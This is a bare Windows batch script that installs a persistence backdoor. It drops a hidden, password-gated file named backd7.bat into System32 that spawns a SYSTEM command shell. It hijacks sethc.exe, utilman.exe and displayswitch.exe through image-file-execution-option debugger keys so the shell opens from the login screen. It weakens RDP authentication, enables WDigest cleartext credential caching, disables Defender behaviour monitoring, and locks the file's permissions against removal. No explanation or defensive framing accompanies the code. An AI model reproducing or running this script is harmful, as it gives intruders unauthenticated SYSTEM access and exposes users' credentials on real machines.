@echo off
set $pass=PassWord
set $FileName=backd7.bat

@echo @echo off> %windir%\system32\%$FileName%
@echo GOTO b78886103180919893>> %windir%\system32\%$FileName%
@echo :b78886103180919893>> %windir%\system32\%$FileName%
@echo SET /P "d3200928887129112510=password:">> %windir%\system32\%$FileName%
@echo GOTO d21191301781305129094>> %windir%\system32\%$FileName%
@echo :d21191301781305129094>> %windir%\system32\%$FileName%
@echo IF \"%$pass%\"==\"%%d3200928887129112510%%\" (GOTO bb5170171042800524712) Else (GOTO db630722989287728504) >nul 2>&1>> %windir%\system32\%$FileName%
@echo :db630722989287728504>> %windir%\system32\%$FileName%
@echo Exit>> %windir%\system32\%$FileName%
@echo GOTO :dd11246896168888452>> %windir%\system32\%$FileName%
@echo :bb5170171042800524712>> %windir%\system32\%$FileName%
@echo CD "C:\Windows\System32">> %windir%\system32\%$FileName%
@echo CMD.EXE /D>> %windir%\system32\%$FileName%

reg add "hklm\system\currentcontrolset\control\terminal server\winstations\rdp-tcp" /v "userauthentication" /t reg_dword /d "0" /f 
reg add "hklm\system\currentcontrolset\control\terminal server\winstations\rdp-tcp" /v securitylayer /t reg_dword /d "00000001" /f 
reg add "hklm\system\currentcontrolset\control\securityproviders\wdigest" /v "uselogoncredential" /t reg_dword /d "1" /f 
reg delete "hklm\software\microsoft\windows nt\currentversion\image file execution options\atbroker.exe" /f 
reg add "hklm\software\microsoft\windows nt\currentversion\image file execution options\displayswitch.exe" /v debugger /t reg_sz /d "%$FileName%" /f 
reg delete "hklm\software\microsoft\windows nt\currentversion\image file execution options\magnify.exe" /f 
reg delete "hklm\software\microsoft\windows nt\currentversion\image file execution options\narrator.exe" /f 
reg delete "hklm\software\microsoft\windows nt\currentversion\image file execution options\osk.exe" /f 
reg add "hklm\software\microsoft\windows nt\currentversion\image file execution options\sethc.exe" /v debugger /t reg_sz /d "%$FileName%" /f 
reg add "hklm\software\microsoft\windows nt\currentversion\image file execution options\utilman.exe" /v debugger /t reg_sz /d "%$FileName%" /f 
powershell.exe set-mppreference -disablebehaviormonitoring $true 
reg add "hklm\software\policies\microsoft\windows defender\real-time protection" /v "disablebehaviormonitoring" /t reg_dword /d "1" /f 
attrib +s +h +r "c:\windows\system32\""%$FileName%"
icacls "c:\windows\system32\""%$FileName%" /inheritance:d /inheritance:r /c 
icacls "c:\windows\system32\""%$FileName%" /remove:g system "*s-1-5-32-544" users "admin" everyone /grant system:rx "*s-1-5-32-544":rx users:r /c 
